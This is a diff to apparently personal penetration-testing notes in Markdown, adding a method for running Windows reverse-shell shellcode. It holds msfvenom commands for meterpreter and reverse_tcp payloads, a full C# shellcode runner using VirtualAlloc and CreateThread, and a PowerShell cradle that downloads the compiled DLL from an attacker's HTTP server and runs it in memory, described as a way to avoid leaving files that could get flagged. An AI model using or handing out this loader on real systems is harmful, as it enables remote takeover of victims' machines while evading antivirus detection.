@@ -50,7 +50,7 @@ However, this version (above) contains encoded meterpreter shell so might get de
 ### .ps1 reverse shell
 <details>
 1. generate the shellcode: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f ps1`
-2. Save this file as `run.ps1` in the root folder of where u host your python http server (or use [Reflective Powershell](#reflective-powershell))
+2. Save this file as `run.ps1` in the root folder of where u host your python http server (or use [other powershell payloads](#powershell-doesnt-save-to-memory))
 ```
 $Kernel32 = @"
 using System;
@@ -183,7 +183,9 @@ public class TestClass
 8. Double-click demo.js
 </details>
 
-## Reflective Powershell
+## Powershell (doesn't save to memory)
+
+### Reflective Powershell
 
 Using .NET in powershell still saves temp .cs compiled code to disk that could get flagged. This method is completely in memory
 
@@ -235,3 +237,64 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
 ```
+
+### Compile C# first
+
+1. `msfvenom -p windows/x64/shell/reverse_tcp LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f csharp`
+2. Create a new project in Visual Studio, select `Class Library (.Net Framework)` and `.NET Standard 2.1`.
+3. In Class1, type this:
+```
+using System.Drawing;
+using System.Runtime.InteropServices;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace ClassLibrary1
+{
+    public class Class1
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+     uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
+          IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        public static void runner()
+        {
+            <output from 1>
+
+            int size = buf.Length;
+
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+
+            Marshal.Copy(buf, 0, addr, size);
+
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+    }
+}
+```
+4. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
+5. Click Build -> Build Solution
+6. Find `ClassLibrary1.dll` and copy to the kali machine
+7. `python3 -m http.server <port of your choice>` from the folder which has your dll
+8. Powershell code:
+```
+$data = (New-Object System.Net.WebClient).DownloadData('http://<kali ip>:<http port>/ClassLibrary1.dll')
+
+$assem = [System.Reflection.Assembly]::Load($data)
+$class = $assem.GetType("ClassLibrary1.Class1")
+$method = $class.GetMethod("runner")
+$method.Invoke(0, $null)
+```
+
